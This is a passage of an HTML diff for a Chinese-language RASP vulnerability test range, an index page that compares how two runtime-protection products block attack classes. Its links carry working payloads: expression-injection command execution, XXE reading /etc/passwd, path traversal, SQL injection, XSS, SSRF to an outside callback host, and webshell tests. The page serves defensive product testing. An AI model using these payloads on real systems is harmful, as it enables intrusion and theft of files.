@@ -1,11 +1,827 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Index</title>
+    <title>Rasp 漏洞测试靶场 v1.0</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+        }
+
+        .content {
+            width: 1000px;
+            margin: 0 auto;
+        }
+
+        header.header {
+            padding: 25px 0 15px;
+            color: #333;
+            font-size: 16px;
+            line-height: 26px;
+        }
+
+        main.main {
+            display: flex;
+        }
+
+        .main-left {
+            flex: 1;
+            margin-right: 20px;
+        }
+
+        .main-right {
+            flex: 1;
+        }
+
+        .block-box {
+            border: 1px solid #eee;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+
+        .block-title {
+            padding: 0 15px;
+            height: 40px;
+            border-bottom: 1px solid #eee;
+            line-height: 40px;
+            background-color: #ededed;
+        }
+
+        .block-content {
+            padding: 5px 15px;
+
+        }
+
+        .item-row {
+            position: relative;
+            padding: 5px 50px 5px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .item-row:last-child {
+            border: none;
+        }
+
+        .item-row-title:hover {
+            color: #01AAED;
+        }
+
+        .item-row-title {
+            font-size: 15px;
+            line-height: 24px;
+            color: #555;
+            text-decoration: none;
+        }
+
+        .item-row-des {
+            font-size: 13px;
+            line-height: 20px;
+            color: #999;
+        }
+
+        .icon-left {
+            position: absolute;
+            top: 50%;
+            transform: translate(0, -50%);
+            right: 35px;
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+
+        }
+
+        .icon-right {
+            position: absolute;
+            top: 50%;
+            transform: translate(0, -50%);
+            right: 0px;
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+        }
+
+        .icon-no {
+            background-color: firebrick;
+        }
+
+        .icon-yes {
+            background-color: #4CAF50;
+        }
+
+        .icon-error {
+            background-color: #eb7350;
+        }
+    </style>
 </head>
 <body>
-    <p><a href="index.do">漏洞演示环境首页</a></p>
-    <p><a href="SpELVul.php?id=1">SpringBoot SpEL注入漏洞测试地址</a></p>
+
+<div class="content">
+    <header class="header">
+        <b>漏洞测试靶场 v1.0</b>
+        <br>本页面为 RASP 技术测试整合页。包括自写测试样例及部分网上漏洞复现或测试文件。<br>
+        用以汇总和测试 RASP 技术产品针对不同种类漏洞的 Hook 点的效果及尝试进行绕过。<br>
+        并且使用本产品默认配置及百度开源产品 [OpenRASP-v1.3.2] official 全部功能配置 block 进行测试。<br>
+        并对每个测试结果进行了标注，左侧为本产品的测试结果，右侧为 OpenRASP 的测试结果，其中绿色为成功防御攻击，红色为不能防御攻击，黄色为经测试该 Hook 项可能对正常功能造成了影响。<br>
+
+    </header>
+    <main class="main">
+        <div class="main-left">
+            <div class="block-box">
+                <header class="block-title">命令执行</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="/Command/RuntimeExec.php?cmd=whoami">Runtime exec()</a>
+                        <div class="item-row-des">直接使用 Runtime.getRuntime().exec() 方法执行系统命令</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="/Command/UNIXProcess.php?cmd=whoami">UNIXProcess</a>
+                        <div class="item-row-des">反射调用 UNIXProcess 执行 linux 系统命令，绕过 Runtime Hook</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">表达式注入漏洞</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/expression/mvel.jsp?exp=java.lang.Runtime.getRuntime().exec(%27whoami%27).getInputStream();">
+                            mvel2</a>
+                        <div class="item-row-des">org.mvel2.MVEL.eval() 表达式注入执行命令</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/expression/ognl.jsp?poc=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream()">
+                            ognl</a>
+                        <div class="item-row-des">ognl.Ognl.getValue() 表达式注入执行命令</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/expression/ognl-file.jsp?poc=new%20java.io.File(%22/tmp/1.txt%22).delete()">
+                            ognl file </a>
+                        <div class="item-row-des">表达式使用 FileReader 或 File 读取文件内容</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/expression/spel.jsp?exp=T(java.lang.Runtime).getRuntime().exec(%27whoami%27)">
+                            spel</a>
+                        <div class="item-row-des">SpelExpressionParser().parseExpression() 执行命令</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/expression/jstl.jsp?url=file:///tmp/1.txt"> jstl
+                            import
+                            file </a>
+                        <div class="item-row-des"><%= %> jstl 使用 file 协议引入文件</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/expression/jstl.jsp?url=http://127.0.0.1:9000"> jstl
+                            import
+                            SSRF </a>
+                        <div class="item-row-des"><%= %> jstl 使用使用 http 协议进行 SSRF，访问本地 9000 端口</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">Java 反序列化漏洞</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/deserialization/deserialization.jsp"> 反序列化漏洞 </a>
+                        <div class="item-row-des">反序列化漏洞测试用例</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">fastJSON 反序列化漏洞</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/fastjson/fastjson.html"> fastJSON </a>
+                        <div class="item-row-des">fastJSON 反序列化漏洞执行</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">Jackson 反序列化漏洞</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/jackson/jackson.jsp"> Jackson </a>
+                        <div class="item-row-des">使用远程恶意 xml 进行本地文件读取</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">XStream 反序列化漏洞</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/xstream/xstream.jsp">xstream</a>
+                        <div class="item-row-des">xstream 反序列化漏洞执行本地命令</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                </main>
+            </div>
+            <script>
+                function postData(index) {
+                    var address;
+                    switch (index) {
+                        case 1:
+                            address = "./modules/xxe/saxbuilder.jsp";
+                            break;
+                        case 2:
+                            address = "./modules/xxe/saxparserfactory.jsp";
+                            break;
+                        case 3:
+                            address = "./modules/xxe/saxreader.jsp";
+                            break;
+                        case 4:
+                            address = "./modules/xxe/saxtranformerfactory.jsp";
+                            break;
+                        case 5:
+                            address = "./modules/xxe/schemafactory.jsp";
+                            break;
+                        case 6:
+                            address = "./modules/xxe/transformerfactory.jsp";
+                            break;
+                        case 7:
+                            address = "./modules/xxe/unmarshaller.jsp";
+                            break;
+                        case 8:
+                            address = "./modules/xxe/xmlreader.jsp";
+                            break;
+                    }
+                    document.form.action = address;
+                    document.form.submit();
+                }
+            </script>
+
+            <div class="block-box">
+                <header class="block-title">XXE 漏洞</header>
+                <main class="block-content">
+                    <form id="xxe" action="" method="POST" name="form" enctype="text/plain">
+                        <input type="hidden" name="&lt;&#63;xml&#32;version" value="&quot;1&#46;0&quot;&#32;encoding&#61;&quot;UTF&#45;8&quot;&#63;&gt;&#13;&#10;&#9;&lt;&#33;DOCTYPE&#32;test&#32;&#91;&lt;&#33;ELEMENT&#32;test&#32;ANY&#32;&gt;&#13;&#10;&#9;&lt;&#33;ENTITY&#32;xxe&#32;SYSTEM&#32;&quot;file&#58;&#47;&#47;&#47;etc&#47;passwd&quot;&#32;&gt;&#13;&#10;&#93;&gt;&#13;&#10;&lt;root&gt;&lt;name&gt;&amp;xxe&#59;&lt;&#47;name&gt;&lt;&#47;root&gt;" />
+                        <div class="item-row">
+                            <a class="item-row-title" href="#" onclick="postData(1)">sax builder</a>
+                            <div class="item-row-des">使用 SAXBuilder().build() 解析</div>
+                            <span class="icon-left icon-yes"></span>
+                            <span class="icon-right icon-error"></span>
+                        </div>
+
+                        <div class="item-row">
+                            <a class="item-row-title" href="#" onclick="postData(2)">sax parser factory</a>
+                            <div class="item-row-des">使用 SAXParserFactory.newSAXParser().parse() 解析</div>
+                            <span class="icon-left icon-yes"></span>
+                            <span class="icon-right icon-error"></span>
+                        </div>
+
+                        <div class="item-row">
+                            <a class="item-row-title" href="#" onclick="postData(3)">sax reader</a>
+                            <div class="item-row-des">使用 SAXReader().read() 解析</div>
+                            <span class="icon-left icon-yes"></span>
+                            <span class="icon-right icon-no"></span>
+                        </div>
+
+                        <div class="item-row">
+                            <a class="item-row-title" href="#" onclick="postData(4)">sax transformer
+                                factory</a>
+                            <div class="item-row-des">使用 SAXTransformerFactory.newTransformerHandler() 解析</div>
+                            <span class="icon-left icon-yes"></span>
+                            <span class="icon-right icon-error"></span>
+                        </div>
+
+                        <div class="item-row">
+                            <a class="item-row-title" href="#" onclick="postData(5)">schema factory</a>
+                            <div class="item-row-des">使用 SchemaFactory.newSchema() 解析</div>
+                            <span class="icon-left icon-yes"></span>
+                            <span class="icon-right icon-yes"></span>
+                        </div>
+
+                        <div class="item-row">
+                            <a class="item-row-title" href="#" onclick="postData(6)">transformer factory</a>
+                            <div class="item-row-des">使用 TransformerFactory.newTransformer().transform() 解析</div>
+                            <span class="icon-left icon-yes"></span>
+                            <span class="icon-right icon-error"></span>
+                        </div>
+
+                        <div class="item-row">
+                            <a class="item-row-title" href="#" onclick="postData(7)">unmarshaller</a>
+                            <div class="item-row-des">使用 JAXBContext.createUnmarshaller().unmarshal() 解析</div>
+                            <span class="icon-left icon-yes"></span>
+                            <span class="icon-right icon-error"></span>
+                        </div>
+
+                        <div class="item-row">
+                            <a class="item-row-title" href="#" onclick="postData(8)">xml reader</a>
+                            <div class="item-row-des">使用 XMLReaderFactory.createXMLReader().parse() 解析</div>
+                            <span class="icon-left icon-yes"></span>
+                            <span class="icon-right icon-error"></span>
+                        </div>
+
+                        <div class="item-row">
+                            <a class="item-row-title" href="./modules/xxe/xxe.jsp?str=%3c%3fxml+version%3d%221.0%22+encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE+test+%5b%3c!ELEMENT+test+ANY+%3e%3c!ENTITY+xxe+SYSTEM+%22file%3a%2f%2f%2f%2f%2f%2f%2fUsers%22+%3e%5d%3e%3croot%3e%3cname%3e%26xxe%3b%3c%2fname%3e%3c%2froot%3e">xml reader</a>
+                            <div class="item-row-des">使用自引入包代替sun包绕过检测</div>
+                            <span class="icon-left icon-yes"></span>
+                            <span class="icon-right icon-error"></span>
+                        </div>
+                    </form>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">协议漏洞</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/protocol/weblogict3.html">Weblogic t3</a>
+                        <div class="item-row-des">CVE-2020-2555 Weblogic t3 协议反序列化漏洞</div>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/protocol/mysql.html">MySQL 协议漏洞</a>
+                        <div class="item-row-des">恶意 MySQL 服务端读取客户端文件内容</div>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/protocol/tomcatajp.html">Tomcat AJP</a>
+                        <div class="item-row-des">CVE-2020-1938 Tomcat AJP 协议文件包含漏洞</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">扫描器特征检测</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/servlet/scanner.jsp">扫描器</a>
+                        <div class="item-row-des">通过替换 UA 为扫描器来模拟扫描器行为</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">黑名单阻断</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/servlet/ipblacklist.jsp">IP 黑名单</a>
+                        <div class="item-row-des">通过配置文件，禁止某些 IP 访问应用系统</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href=".git">URL 黑名单</a>
+                        <div class="item-row-des">通过配置文件，禁止访问应用系统预置的某些 URL 连接</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">动态补丁拦截</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/patch/patch.jsp">动态补丁拦截</a>
+                        <div class="item-row-des">通过补丁动态修补参数</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">模拟社区项目测试</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="index.do">项目主页</a>
+                        <div class="item-row-des">测试项目主页</div>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="rasp.action">文件下载</a>
+                        <div class="item-row-des">可测试Struts2漏洞</div>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="getArticle.do?articleId=100001">文章详情/评论留言</a>
+                        <div class="item-row-des">可用来测试注入、XSS等漏洞</div>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="index.jsp">测试打印信息</a>
+                        <div class="item-row-des">输出浏览器和请求信息</div>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="TestServlet?id=1">Servlet</a>
+                        <div class="item-row-des">Servlet 测试页面</div>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="TestFilter?id=1">Filter测试</a>
+                        <div class="item-row-des">Filter 测试页面</div>
+                    </div>
+                </main>
+            </div>
+        </div>
+        <div class="main-right">
+            <div class="block-box">
+                <header class="block-title">文件系统操作</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/filesystem/AsynchronousFileChannel.jsp?file=/tmp/1.txt">nio
+                            AsynchronousFileChannel</a>
+                        <div class="item-row-des">使用 nio AsynchronousFileChannel 进行文件读取操作</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-error"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/filesystem/file-list.jsp?dir=../../../../../../../../../../Users/">File
+                            list()</a>
+                        <div class="item-row-des">使用 File 对象的 list() 方法进行文件遍历</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/filesystem/file-read.jsp?file=/tmp/1.txt">File</a>
+                        <div class="item-row-des">使用 File 创建对象并转为 FileInputStream 进行读取</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/filesystem/file-rename.jsp?s=/tmp/1.txt&d=/tmp/2.txt">File
+                            rename</a>
+                        <div class="item-row-des">使用 File rename 进行重命名</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/filesystem/file-w.jsp?f=/tmp/1.txt&c=aaa">FileOutputStream
+                            write</a>
+                        <div class="item-row-des">使用 FileOutputStream write() 方法写入文件</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/filesystem/FileOutputStream.jsp?name=shell.jsp">FileOutputStream
+                            write</a>
+                        <div class="item-row-des">模拟写 shell 木马，访问生成木马，shell 内容不从参数传递</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/filesystem/FileInputStream.jsp?name=../../../../../../../../tmp/1.txt">FileInputStream
+                            read</a>
+                        <div class="item-row-des">使用 FileInputStream read() 方法读文件</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/filesystem/files.jsp?file=/tmp/1.txt">nio Files
+                            readAllBytes()</a>
+                        <div class="item-row-des">使用 nio Files readAllBytes() 读取文件</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/filesystem/files-copy.jsp?source=/etc/passwd&dest=/tmp/2.txt"> nio Files
+                            copy</a>
+                        <div class="item-row-des">使用 nio Files copy() 进行文件拷贝或目录拷贝</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/filesystem/files-create.jsp?path=/tmp/3.txt">nio Files
+                            createFile()</a>
+                        <div class="item-row-des">使用 nio Files createFile() 创建文件</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/filesystem/files-delete.jsp?path=/tmp/3.txt">nio Files
+                            delete()</a>
+                        <div class="item-row-des">使用 nio Files delete() 删除文件</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/filesystem/file-rw.jsp?f=/tmp/1.txt">RandomAccessFie
+                            read()</a>
+                        <div class="item-row-des">反射调用 RandomAccessFie read() 读取文件</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/filesystem/reflect-file.jsp">RandomAccessFie
+                            readLine()</a>
+                        <div class="item-row-des">反射调用 RandomAccessFie readLine 读取 /etc/passwd</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">JDBC SQL注入漏洞</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/jdbc/mysql.jsp?id=6+or+1=1+--+-">JDBC SQL注入</a>
+                        <div class="item-row-des">整型注入测试</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/jdbc/jdbc-multipart.jsp">JDBC multipart 请求格式</a>
+                        <div class="item-row-des">multipart 传参注入测试</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/jdbc/json.jsp?id=6+union+select+version()">JSON 格式 SQL
+                            注入</a>
+                        <div class="item-row-des">JSON 格式传参注入测试</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">文件上传</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/servlet/fileupload/_commonio.jsp">ServletFileUpload
+                            parseRequest</a>
+                        <div class="item-row-des">ServletFileUpload parseRequest 文件上传测试</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/servlet/fileupload/file-upload2.html">ServletFileUpload
+                            getItemIterator</a>
+                        <div class="item-row-des">ServletFileUpload getItemIterator 文件上传测试</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/servlet/fileupload/file-upload1.jsp">HttpServletRequest.getParts()</a>
+                        <div class="item-row-des">Servlet3.0 getParts() 文件上传，本版本环境暂不支持，但已经测试通过</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/spring/fileupload.jsp">Spring FileUpload</a>
+                        <div class="item-row-des">Spring MultipartFile 文件上传 测试</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/spring/qpencode.jsp">Spring FileUpload Bypass</a>
+                        <div class="item-row-des">Spring MultipartFile 文件上传 QP 编码变形文件名测试</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/servlet/fileupload/tomcat.html">Tomcat PUT 文件上传</a>
+                        <div class="item-row-des">CVE-2017-12615，影响版本 Apache Tomcat 7.0.0 - 7.0.81</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">XSS 跨站脚本攻击</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/servlet/xss.jsp?input=%3cscript%3ealert(1)%3c%2fscript%3e">反射型 XSS</a>
+                        <div class="item-row-des">反射型 XSS</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/servlet/xss.jsp?input=%3cscript%3ealert(1);alert(1);alert(1);alert(1);alert(1);alert(1);alert(1);alert(1);alert(1);alert(1);alert(1);%3c%2fscript%3e">反射型
+                            XSS
+                            chunk</a>
+                        <div class="item-row-des">反射型 XSS chunk</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/servlet/cookiexss.jsp">Cookie XSS</a>
+                        <div class="item-row-des">在 Cookie 中注入 XSS 代码进行某些情况下的跨站</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/servlet/queryxss.jsp?a=1&b=2&c=3">getQueryString XSS</a>
+                        <div class="item-row-des">开发人员使用 getQueryString 获取页面参数时可能造成XSS</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/servlet/headerxss.jsp">header XSS</a>
+                        <div class="item-row-des">开发人员将 header 值放入可能造成XSS</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/servlet/parammap.jsp?a=1&b=2&c=3&a=<script>alert(1)</script>">getParameterMap
+                            XSS</a>
+                        <div class="item-row-des">开发人员使用 getParameterMap 获取页面参数时可能造成XSS</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">JNI Native 方法调用禁止</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/jni/loadlibrary.jsp?cmd=whoami">native 方法执行命令</a>
+                        <div class="item-row-des">测试文件会在临时目录自动生成链接库，支持win32/64,centos7,macos</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">SSRF 服务器端请求伪造漏洞</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/ssrf/urlconnection.jsp?url=http://aaxxsdada.ceye.io">url
+                            connection</a>
+                        <div class="item-row-des">使用 HttpURLConnection 建立连接</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/ssrf/resttemplate.jsp?url=http://aaxxsdada.ceye.io">rest
+                            template</a>
+                        <div class="item-row-des">使用 RestTemplate 建立连接</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/ssrf/_okhttp.jsp?url=http://aaxxsdada.ceye.io">okhttp</a>
+                        <div class="item-row-des">使用 okhttp 建立连接</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/ssrf/_okhttp3.jsp?url=http://aaxxsdada.ceye.io">okhttp3</a>
+                        <div class="item-row-des">使用 okhttp3 建立连接</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/ssrf/_httpclient.jsp?url=http://aaxxsdada.ceye.io">httpclient</a>
+                        <div class="item-row-des">使用 http.client 建立连接</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/ssrf/_commons_httpclient.jsp?url=http://aaxxsdada.ceye.io">commons
+                            httpclient</a>
+                        <div class="item-row-des">使用 commons.httpclient 建立连接</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/ssrf/redirect/urlredirect.jsp?url=http://aaxxsdada.ceye.io">url redirect</a>
+                        <div class="item-row-des">使用 HttpURLConnection 设置 URL 重定向</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="http://localhost:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:54321">Weblogic
+                            SSRF</a>
+                        <div class="item-row-des">CVE-2014-4210 SSRF漏洞，影响版本 10.0.2,10.3.6</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">WebShell 恶意文件特征检测</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/webshell/index.jsp">JSP 菜刀马</a>
+                        <div class="item-row-des">带有 >||< 特征的菜刀马</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title" href="./modules/webshell/test.jsp">JspSpy 大马</a>
+                        <div class="item-row-des">著名的 JspSpy 大马</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/cmd/jshell.jsp?src=new%20java.io.BufferedReader(new%20java.io.InputStreamReader(Runtime.getRuntime().exec(%22whoami%22).getInputStream())).readLine()">jshell一句话</a>
+                        <div class="item-row-des">真正的 Java 一句话木马</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-no"></span>
+                    </div>
+                </main>
+            </div>
+
+            <div class="block-box">
+                <header class="block-title">Java 特性</header>
+                <main class="block-content">
+                    <div class="item-row">
+                        <a class="item-row-title"
